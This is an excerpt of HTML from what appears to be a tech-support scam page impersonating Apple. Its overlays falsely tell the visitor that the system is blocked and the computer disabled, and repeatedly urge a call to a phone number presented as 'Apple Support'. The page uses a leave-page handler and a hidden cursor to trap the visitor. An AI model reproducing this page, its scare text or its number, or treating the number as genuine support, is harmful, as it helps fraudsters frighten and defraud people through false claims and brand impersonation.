  ...
  <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
      ...
      <div class="row">
        <div class="col-md-12">
          <div class="right-foot" style="text-align:center">
            ...
            <span style="font-weight:500;padding-left:13px;color:#fff; ">Call Apple Support: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> +1-888-928-5672
              </span>
            </span>
          </div>
        </div>
    ...
    <div class="lightbox" id="dwewfweqqquuu" style="display: block;">
      ...
      <div id="disclaimer">Access to this System has been blocked for security reasons.  <br>
        <span class="support" style="font-size:22px;">Call Apple Support: &nbsp; <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> +1-888-928-5672
          </span>
        </span>
      </div>
      <div id="bottom">
    ...
    <div class="cardcontainer" style="cursor: none; display: block;" id="qwwqwewqellkk">
      ...
      <p style="padding-bottom:0;color:#fff;font-size:16px">Call Apple Support: <strong>
          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> +1-888-928-5672
          </span>
        </strong>
      </p>
    ...
    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
      <p style="color:#fff;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">You should contact us immediately so that our engineers can guide you through the removal process by phone. <br>Your computer is disabled.<br>
        <strong>Call Apple Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> +1-888-928-5672
          </span>
        </strong>
      </p>
    </div>
    <div id="chat" style="display: block;">
      ...
      <h4 style="font-weight:600;font-size:22px"> +1-888-928-5672
